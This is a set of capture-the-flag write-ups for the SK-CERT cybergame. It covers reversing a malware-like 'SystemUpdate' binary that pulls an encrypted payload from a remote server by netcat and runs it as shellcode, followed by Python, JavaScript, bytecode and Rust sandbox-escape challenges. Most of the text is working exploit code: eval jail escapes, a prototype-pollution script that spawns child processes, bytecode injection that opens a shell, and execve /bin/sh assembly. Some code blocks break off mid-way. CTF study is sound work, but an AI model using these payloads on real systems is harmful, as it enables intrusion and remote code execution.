## [★★☆] The Chronicles of Greg

### SystemUpdate incident report

Description

>Greg didn’t ask for this. Greg wanted a quiet Friday, maybe a donut, and ideally no malware. But no. Instead, Greg found logs—weird logs. And when Greg sees weird logs, Greg investigates. This is Greg’s story.

############

Analyst Log – 09:14 AM: "They called it a 'low-priority anomaly.' Said it was probably nothing. That’s what they always  
say before things explode". I ran strings on the file—didn’t like what I saw. Not an update. Not even ransomware. Just…  
vibes. Binary vibes. They’ve named it internally ‘SystemUpdate.’ I don’t know why. No update was done. I’m not even sure  
if this is about system update anymore.

############

##### Solution

On analysing the `system_update`  binary I found subroutine `sub_20C0` had suspicious encodings that I wrote a script to decode 
```python
def solve():
    target = [int(x, 16) for x in "F9 FF 8F E0 EA C6 FE 2A CC 9D E6 9A 92 D3 C4 CB 20 E1 DF D7 95 E0 CC 2F".split()]
    ops = [
        (1, 0xF8), (1, 0xEE), (2, None), (3, 0xA3), (1, 0xFB),
        (1, 0xEC), (1, 0xF6), (1, 0xF1), (1, 0xF7), (1, 0xF4),
        (1, 0xF1), (1, 0xFD), (3, 0xA3), (1, 0xFD), (3, 0xA3),
        (1, 0xF6), (1, 0xEC), (1, 0xF1), (1, 0xFC), (1, 0xF7),
        (1, 0xF9), (1, 0xF0), (1, 0xF4), (1, 0xF0)
    ]

    flag = []
    for i in range(24):
        op, k = ops[i]
        t = target[i]
        if op == 1:
            c = (k - (t ^ 0x5C)) & 0xFF
        elif op == 2:
            c = (- (t ^ 0x5C)) & 0xFF
        elif op == 3:
            c = (t ^ k) & 0xFF
        flag.append(chr(c))

    s = ''.join(flag)
    print(s)

    # verify
    check = []
    for i in range(24):
        op, k = ops[i]
        c = ord(s[i])
        if op == 1:
            o = ((k - c) & 0xFF) ^ 0x5C
        elif op == 2:
            o = ((-c) & 0xFF) ^ 0x5C
        elif op == 3:
            o = c ^ k
        check.append(o & 0xFF)

    if check == target:
        print("ok")
    else:
        print("fail")

if __name__ == "__main__":
    solve()

```

### The Blob Whisperer


Description

>Analyst Log – 12:47 PM: The blob showed up after SystemUpdate did its thing. Just a data. No extension. No metadata. No readme. No hope. The problem? There. Is. No. Key. I’ve tried dictionary attacks, rainbow tables, entropy analysis, even feeding it to a very confused intern. Nothing… At one point, I shouted my Wi-Fi password at the screen out of raw frustration. Didn’t help, but I felt better for two seconds. I thought I saw a familiar pattern in the entropy graph. Turns out it was just a coffee stain on my monitor. This isn’t just encryption. This is a test of character. And Greg? Greg is not winning.

Solution

When `system_update` is run with a parameter it connects to a remote server and sends the value of that parameter.

If the value is wrong, then it get a basic command back like `COMMAND: apt update`.

Running strings on the binary we get an `ip` address and  basically I did an `strace` and found the `ip` and port the binary connects to 

```python
connect(3, {sa_family=AF_INET, sin_port=htons(7052), sin_addr=inet_addr("195.168.112.4")}, 16) = 0
```

If the value is the  flag `SK-CERT{g3771ng_p4yl04d}` we got in the first part then it gets a payload that is encrypted  
![image](https://gist.github.com/user-attachments/assets/0b6bf238-e7b6-450a-beb2-b0417f612c0c)


Function `sub_1D20` does the decryption of the payload 

```python
__int64 __fastcall sub_1D20(__int64 a1, unsigned int a2)
{
  __int64 v2; // r14
  unsigned int v3; // eax
  __int64 v4; // r14
  __int64 v5; // rax
  int v6; // ebx
  int v7; // ebx
  void *v8; // rax
  void (*v9)(void); // rax
  int v11; // [rsp+Ch] [rbp-105Ch] BYREF
  _BYTE v12[16]; // [rsp+10h] [rbp-1058h] BYREF
  _BYTE v13[16]; // [rsp+20h] [rbp-1048h] BYREF
  _BYTE src[4152]; // [rsp+30h] [rbp-1038h] BYREF

  v2 = 0;
  v3 = sub_1C30("/lib/x86_64-linux-gnu/libc.so.6");
  srand(v3);
  do
  {
    v12[v2] = rand() % 256;
    v13[v2++] = rand() % 256;
  }
  while ( v2 != 16 );
  v4 = EVP_CIPHER_CTX_new();
  v5 = EVP_aes_128_cbc();
  EVP_DecryptInit_ex(v4, v5, 0, v12, v13);
  EVP_DecryptUpdate(v4, src, &v11, a1, a2);
  v6 = v11;
  if ( (int)EVP_DecryptFinal_ex(v4, &src[v11], &v11) <= 0 )
  {
    EVP_CIPHER_CTX_free(v4);
  }
  else
  {
    v7 = v11 + v6;
    EVP_CIPHER_CTX_free(v4);
    if ( v7 >= 0 )
    {
      src[v7] = 0;
      v8 = mmap(0, (int)a2, 7, 34, -1, 0);
      if ( v8 != (void *)-1LL )
      {
        v9 = (void (*)(void))memcpy(v8, src, v7);
        v9();
        return 0;
      }
      perror("mmap");
    }
  }
  return 1;
}
```

The key to this encryption is generated by `rand()` that is seeded by `srand()` with a seed derived from a major/minor version of current LIBC.

We notice the first 5 bytes of the payload are discarded. I removed the 5 bytes from the saved payload then bruteforced the seed using a c script and found version 2.38 was the correct version.


```python
echo "SK-CERT{g3771ng_p4yl04d}" | nc 195.168.112.4 7052  > payload.bin
```


```c
#include <stdio.h>

#include <openssl/evp.h>
#include <openssl/aes.h>

unsigned int gen_seed(unsigned int major, unsigned int minor) {
    unsigned int val = (major << 16) | (minor << 8) | (major ^ minor);
    val = (val ^ (val >> 13)) * 0x5bd1e995;
    return val ^ (val >> 15);
}

int decrypt(const char* in_file, const char* out_file, unsigned int seed) {
    FILE* f = fopen(in_file, "rb");
    if (!f) return -1;

    fseek(f, 0, SEEK_END);
    long len = ftell(f);
    fseek(f, 0, SEEK_SET);

    unsigned char* enc = malloc(len);
    fread(enc, 1, len, f);
    fclose(f);

    unsigned char key[16], iv[16];
    srand(seed);
    for (int i = 0; i < 16; i++) {
        key[i] = rand() & 0xFF;
        iv[i] = rand() & 0xFF;
    }

    unsigned char* dec = malloc(len + AES_BLOCK_SIZE);
    int l, dec_len;

    EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();
    EVP_DecryptInit_ex(ctx, EVP_aes_128_cbc(), NULL, key, iv);
    EVP_DecryptUpdate(ctx, dec, &l, enc, len);
    dec_len = l;

    if (EVP_DecryptFinal_ex(ctx, dec + l, &l) > 0) {
        dec_len += l;
        FILE* out = fopen(out_file, "wb");
        if (out) {
            fwrite(dec, 1, dec_len, out);
            fclose(out);
            printf("[+] %s ok\n", out_file);
        }
    } else {
        printf("[-] %s fail\n", out_file);
    }

    EVP_CIPHER_CTX_free(ctx);
    free(enc);
    free(dec);
    return 0;
}

int main() {
    const char* infile = "payload.bin";
    char outfile[256];

    for (unsigned int major = 2; major <= 2; major++) {
        for (unsigned int minor = 21; minor <= 41; minor++) {
            unsigned int seed = gen_seed(major, minor);
            snprintf(outfile, sizeof(outfile), "%u.%u_deciphered.bin", major, minor);
            decrypt(infile, outfile, seed);
        }
    }

    return 0;
}

```


Checking the decrypted payload

We see interesting strings `/tmp/s` `/bin/s` indicating its a shellcode I mapped the shellcode to memory running it and checking the `tmp` directory we confirm it copied contents there

```c

#include <string.h>
#include <sys/mman.h>
#include <unistd.h>

int main() {
    FILE *f = fopen("2.38_deciphered.bin", "rb");
    if (!f) { perror("open"); return 1; }

    fseek(f, 0, SEEK_END);
    long sz = ftell(f);
    rewind(f);

    char *buf = malloc(sz);
    if (!buf) { perror("malloc"); fclose(f); return 1; }

    if (fread(buf, 1, sz, f) != sz) {
        perror("read");
        free(buf);
        fclose(f);
        return 1;
    }
    fclose(f);

    void *mem = mmap(0, sz, PROT_READ | PROT_WRITE | PROT_EXEC,
                     MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (mem == MAP_FAILED) {
        perror("mmap");
        free(buf);
        return 1;
    }

    memcpy(mem, buf, sz);
    free(buf);

    printf(">> running shellcode...\n");
    ((void(*)())mem)();

    munmap(mem, sz);

### The Shared Object Prophecy

Description

>Analyst Log – 17:23 PM: I followed the execution trail. It ended in the most cursed way imaginable: custom libc. Who  
writes their own libc? What kind of monster wakes up and chooses that? Greg is tired. Greg is afraid. Greg wants his  
weekend back.

Solution

From the libc.so we got from the previous part and with the description given I knew it was a custom or modified libc.so so I decided to reverse it. After hours and hours of checking the disassembly I decided to check the usual or rather obvious functions and found `_GI___libc_write` was modified with extra patterns of what looked like encryptions 

Through this script I reversed the operations and recovered the flag and the ip address it connects to 

```python
def s1(buf):
    if len(buf) != 29:
        raise ValueError("s1: bad len")
    out = bytearray(29)

    for i in range(29):
        x = buf[i] ^ i
        x = ~x & 0xFF
        x = (x - i) & 0xFF
        x = (x ^ i) & 0xFF
        x = (x + i) & 0xFF
        x = ((x << 3) | (x >> 5)) & 0xFF

        x = (-((x + i) & 0xFF) ^ i) & 0xFF
        x = (x - i) & 0xFF
        x = (x ^ i) & 0xFF

        t = ((x - 0x7F) ^ 0x74) & 0xFF
        out[i] = (i - t) & 0xFF

    return out

def s2(buf):
    if len(buf) != 14:
        raise ValueError("s2: bad len")
    out = bytearray(14)

    for i in range(14):
        x = buf[i]
        x = (x + i) & 0xFF
        x = (x ^ i) & 0xFF
        x = (x + 99) & 0xFF
        x = (x ^ i) & 0xFF
        x = (x + 0x78) & 0xFF
        x = (x ^ 0x7F) & 0xFF
        x = (x + i) & 0xFF
        x = (-x) & 0xFF
        x = (x ^ 0xE0) & 0xFF
        x = ((x << 1) | (x >> 7)) & 0xFF

        term1 = (x ^ i) & 0xFF
        term2 = (0x2C - i) & 0xFF
        out[i] = (term1 + term2) & 0xFF

    return out

def main():
    s = bytes([
        0xea, 0x06, 0xe0, 0x44, 0x23, 0x20, 0x96, 0xcc,

        0x5a, 0xae, 0x2c, 0x14, 0xfc
    ])

    s2_buf = bytes([
        0x06, 0x09, 0x0c, 0x85, 0x12, 0x8f, 0x82, 0x81,
        0x16, 0x15, 0x91, 0x85, 0x90, 0x3c

    print("-" * 30)

    t2 = s2(s2_buf)

## JAILE2

### Calculator v2

Description
>A new version of The Calculator came out! Can you check if it’s secure?
>`exp.cybergame.sk:7011`

Challenge
```js
import math


def handle_client():
    print(
        "Welcome to the Calculator v2!\nWith improved security so you can have access to all the fun math stuff and the bad guys cannot do the bad stuff! Enjoy :D"
    )

    # We added this to prevent the user from calling dangerous functions
    safe_globals = {
        "__builtins__": {
            "sin": math.sin,
            "cos": math.cos,

            "sum": sum,
        }
    }

    text = ""
    while text != "exit":
        text = input(">>> ")
        # In all ctf writeups they use _ or its unicode equivalent to somehow escape the jail. No _ means no fun for them
        for character in ["_", "＿"]:
            if character in text.lower():
                print("Not allowed, killing\n")
                text = "lol"
        try:
            print(eval(text, safe_globals))
        except Exception as e:
            print("Error: " + str(e) + "\n")


def main():
    handle_client()


if __name__ == "__main__":
    main()

```

Solution
The challenge was basically a Python sandbox, but with a twist. It uses `eval()` to evaluate user input, but it wraps it in a restricted `safe_globals` dict that only exposes a few safe functions — mostly math stuff like `sin`, `cos`, `sqrt`, `abs`, `round`, and so on. No access to `eval`, `exec`, `open`, or even `__builtins__` directly.

But the real kicker is this: it blocks **any** use of the underscore character (`_`) — even the full-width Unicode one (`＿`). And if you’ve done any Python sandbox stuff before, you know that’s brutal. All the classic tricks rely on double underscores: `__class__`, `__subclasses__`, `__globals__`, etc. So with `_` banned, all the usual escape routes are cut off.

They even check your input for `_` and kill it on sight. So whatever payload you’re building has to work **without typing `_` at all**. That’s what makes this challenge spicy — you have to find clever ways to build those dunders without ever writing them directly.


#### Dealing with `_` Restrictions via Unicode Normalization

One of the main restrictions in this challenge is that you cannot use the underscore character (`_`) directly — nor its full-width Unicode equivalent (`＿`). This is enforced by checking the user input string and terminating if any variant appears. However, Python internally normalizes many Unicode characters under the hood, and we can take advantage of this using [NFKC normalization](https://docs.python.org/3/library/unicodedata.html)

To find all Unicode characters that normalize to `_` I ran this simple script:

```python
import unicodedata

for x in range(65537):
    if unicodedata.normalize("NFKC", chr(x)) == "_":
        print(x, chr(x))

```


This helps identify characters that **look different** but will be interpreted as `_` internally by Python once normalized.

---
####  Frame-Walking Without `_`

With `_` completely off the table, I needed a way to access powerful objects like `__import__`, but without writing any underscores at all.

The trick was to use **generator introspection** to access Python’s internal frames. From there, you can walk up the call stack and eventually reach the built-in namespace. Here's the payload I crafted:

```python
[y := [], 
 y.extend([(x.gi︴frame.f︴back.f︴back for x in y)]), 
 [x for x in y[0]][0].f︴builtins['\x5f\x5fimport\x5f\x5f']('os').popen('cat /flag*').read()]
```

A breakdown:

- `y := []` initializes an empty list
    
- I use a generator expression to capture frames: `x.gi︴frame.f︴back.f︴back`
    
- The character `︴` (U+FE34) is **not** an underscore, but some fonts render it similarly. (It likely didn't work directly, but is used here as a visual cue — in code I used string tricks instead.)
    
- Then I access `f︴builtins` and use a hex escape: `'\x5f\x5fimport\x5f\x5f'` to call `__import__` without triggering the input filter.
    
- The rest is a standard file read using `os.popen`.
    

This works because the generator's `gi_frame` gives you access to the current frame object, and walking `f_back` lets you move up the stack. Once you reach the top, you can access the global `__builtins__` object and import anything you want

Solution

At first glance, this challenge seems like a simple JavaScript sandbox running on the Bun runtime. But very quickly, the core limitation becomes clear:

 **You're only allowed to use 2 unique letters per line.**

That means any line you send to the server must contain at most **two different alphabetical characters**. You can repeat them as much as you want, but a third unique letter will instantly get your input rejected.

On top of that, several critical characters are completely banned:  
**`() / [ ] ; " ' _ !`**

These restrictions stop you from doing just about everything you'd normally try in a JavaScript `eval()` challenge:

- ❌ `()` — No function calls. You can't invoke anything directly.
    
- ❌ `[]` — No arrays or property access by string key (e.g., `obj["key"]`).
    
- ❌ `;` — No statement separators.
    
- ❌ `'` or `"` — No strings at all.
    
- ❌ `/` — No regular expressions, and also no division.
    
- ❌ `_` — No access to special objects like `__proto__`, `__defineGetter__`, or `globalThis`.
    
- ❌ `!` — No use of logical negation or tricks like `![]`.
    

Essentially, this removes **most of the language features** you'd typically abuse in a sandbox escape: you can’t use strings, arrays, object keys, or even call functions the usual way.

So the challenge becomes: **How can we coerce or manipulate what’s left — just numbers, operators, and two letters — to eventually execute something useful?**

Despite all the restrictions, the key weakness lies in how the server handles input: it uses `eval()` **on the user’s input**, but only after first checking if the input passes a regex match using `test()`.

This is our entry point. If we can **pollute the prototype of `RegExp`** and replace the `test` method with `eval`, then the next time the server tries to check our input using regex, it will actually end up **evaluating it as JavaScript code** — without any restrictions.

In JavaScript, prototype pollution lets you overwrite properties shared across all objects of a certain type. Here, we exploit that to overwrite `RegExp.prototype.test`.

```python
from pwn import *
import re

FLAG_RE = re.compile(r"flag.+\.txt")

def e(s):
    r = ""
    for x in s:
        r += "\\u00" + hex(ord(x))[2:].zfill(2)
    return r


# r = remote("localhost", 2337)
r = remote("exp.cybergame.sk",7012)

encoded_regexp = e("RegExp")
encoded_proto = e("__proto__")
encoded_test = e("test")
encoded_eval = e("eval")

get_flag_file_payload = """
res = process.mainModule.require("child_process").spawnSync("ls", [".."]).stdout.toString();throw new Error(res);
""".strip()



r.sendlineafter(b"> ", f"$={encoded_regexp}``".encode())
r.sendlineafter(b"> ", f"$$={encoded_eval}".encode())
r.sendlineafter(b"> ", f"$.{encoded_proto}.{encoded_test}=$$")

r.sendlineafter(b"> ", get_flag_file_payload)

r.recvuntil(b"Error: ")

files = r.recvuntil(b"tasty-bun", True).decode()

flag_path = FLAG_RE.search(files).group(0)

print_flag_file_payload = f"""
res = process.mainModule.require("child_process").spawnSync("cat", ["../{flag_path}"]).stdout.toString();throw new Error(res);
"""

r.sendline(print_flag_file_payload)
print(r.recvuntil(b"tasty-bun").decode())

r.interactive()

### Recover the root password

After poking around the file system for a while and exploring different objects exposed through directory traversal, I discovered a path that led straight into the internals of the Python runtime.

By navigating through `/mnt`, I found what appeared to be a dictionary-like object that gave access to a chain of attributes and internal references. Following this path:

```js
/mnt/a/__init__/__globals__/__builtins__/help/__class__/__call__/__globals__/sys/modules/__main__/DirShell/__init__/__code__
```

I eventually landed on the `__code__` object of the `DirShell` class’s `__init__` method  a goldmine in terms of introspection.

From there, I dumped the constant pool of the bytecode using:
```python
cat co_consts
/mnt/a/__init__/__globals__/__builtins__/help/__class__/__call__/__globals__/sys/modules/__main__/DirShell/__init__/__code__$> cat co_consts

```

### Gaining Root Shell via Bytecode Injection

After successfully retrieving the root password by navigating deep into Python’s object model (as explained earlier), I gained access to the `su` command. This unlocked the ability to **rewrite methods** within the application — a powerful privilege.

The plan was to **hijack the `touch` command**, whose implementation lives in:


```python
/mnt/a/__init__/__globals__/__builtins__/help/__class__/__call__/__globals__/sys/modules/__main__/DirShell/touch/__code__`
```

### Python Bytecode Injection

The key to the exploit was rewriting the `co_code` of the `touch` method with **custom Python bytecode**, allowing us to hijack its behavior.

My payload built a new `co_code` byte sequence that:

1. Loaded the `__builtins__` dict using a crafted `LOAD_FAST` offset.
    
2. Accessed `__builtins__["exec"]`.
    
3. Executed `exec(input(...))` to get full code execution.
    

However, since the locals layout was unknown, and LOAD_FAST uses an index, I had to brute-force the right index (`x`) to find the one pointing to `__builtins__`.

Here’s a snippet from the brute-force harness:




```python
OOB = b''.join([bytes([x]) for x in [     *([opmap['EXTENDED_ARG'], x // 256] if x // 256 != 0 else []),     opmap['LOAD_FAST'], x % 256, ]])`
```

```python
import dis
from opcode import opmap
from pwn import *

def rec_cd(path):
    for x in path.split("/"):
        r.sendlineafter(b"> ", f"cd {x}")

def assemble(ops):
    ret = b""
    for op, arg in ops:
        opc = dis.opmap[op]
        ret += bytes([opc, arg])
    return ret

ROOT_PASSWORD = "__YouAreNever$$84982198481nGonnaGu((*8essThiSS_!*&^"


x = 202

while True:
    try:
        print(f"Trying {x}")
        # r = process(["python3", "dirshell.py"])
        r = remote("exp.cybergame.sk", 7001)

        # rec_cd("/mnt/a/__init__/__globals__/__builtins__/help/__class__/__call__/__globals__/sys/modules/__main__/DirShell/__init__/__code__")
        r.sendlineafter(b"> ", "su")
        r.sendlineafter(b"> ", ROOT_PASSWORD)

        rec_cd("/mnt/a/__init__/__globals__/__builtins__/help/__class__/__call__/__globals__/sys/modules/__main__/DirShell/touch/__code__")

        # x = 265
        OOB = b''.join([bytes([x]) for x in [
            *([opmap['EXTENDED_ARG'], x // 256]
            if x // 256 != 0 else []),
            opmap['LOAD_FAST'], x % 256,
        ]])

        co_code = OOB + assemble([
            ("LOAD_FAST",     2),
            ("BINARY_SUBSCR",  0),
            ("LOAD_FAST",     1),
        ]) + OOB + assemble([
            ("CALL_FUNCTION",  2),
            ("RETURN_VALUE",   0),
        ])
        # print(co_code)
        

        # 265 EXEC
        

        r.sendlineafter(b"> ", "rewrite co_code")
        r.sendlineafter(b"> ", co_code.hex())
        rec_cd("/.."*17)

        r.sendlineafter(b"> ", b"""touch exec(input('READYREADYREADY\\n'))""")
        r.sendline(b"exec")

        r.recvuntil(b"file contents: ")
        da = r.recvline(timeout=0.5).strip()
        print(da)
        
        if da == b"READYREADYREADY":
            print("GO FLAG GOGHGOGHGOGHGO", x)
            r.sendline(b"import pty;pty.spawn('/bin/sh')")
            r.interactive()

    except Exception as e:
        print(e)
        pass
    r.close()
```



I assembled the final bytecode using Python's built-in `dis.opmap`, creating valid instructions for Python 3.9 — which was crucial, since the remote system used that specific version.

Once the injected function was in place, I navigated back to root and triggered it by running:

```python
touch exec(input('READYREADYREADY\n'))
```

If the injection worked, the output was simply: `READYREADYREADY`

This was my signal that `exec()` had been successfully injected. From there, I just launched a PTY shell:

```python
import pty; pty.spawn('/bin/sh')`
```

And that was game over. 🏁

Solution

This challenge gave us a sandboxed Rust runtime with a constrained custom `main.rs` environment. 

After researching Rust’s inline assembly and raw x86-64 opcodes, I discovered that we could **manually emit `syscall`** using the raw instruction bytes:

```rust
.byte 0x0F, 0x05  ; syscall
```

Combined with `core::arch::asm`, we could construct the entire RCE payload manually — without relying on filtered terms.

Here’s the payload that spawns `/bin/sh` via syscall 59 (`execve`):

```rust
use core::arch::asm;
unsafe {
    asm!(
        "xor rsi, rsi",                        // NULL argv
        "push rsi",
        "mov rbx, 0x68732f2f6e69622f",         // //bin/sh
        "push rbx",
        "mov rdi, rsp",                        // pointer to "/bin//sh"
        "xor rdx, rdx",                        // NULL envp
        "mov rax, 59",                         // syscall: execve
        ".byte 0x0F, 0x05",                    // syscall
        options(noreturn)
    );
}

```

The build system only accepted **single-line input**, and multi-line `asm!` blocks were error-prone when passed via `input()`.

So I collapsed the code into a single line:
```rust
use core::arch::asm;unsafe{asm!("xor rsi,rsi;push rsi;mov rbx,0x68732f2f6e69622f;push rbx;mov rdi,rsp;xor rdx,rdx;mov rax,59;.byte 0x0F,0x05",options(noreturn));}
```

This successfully compiled under `cargo build --target x86_64-unknown-none`, bypassed the checks, and gave me a shell from `_start()`!

```sh
 nc exp.cybergame.sk 7010
Give me code> use core::arch::asm;unsafe{asm!("xor rsi,rsi;push rsi;mov rbx,0x68732f2f6e69622f;push rbx;mov rdi,rsp;xor rdx,rdx;mov rax,59;.byte 0x0F,0x05",options(noreturn));}
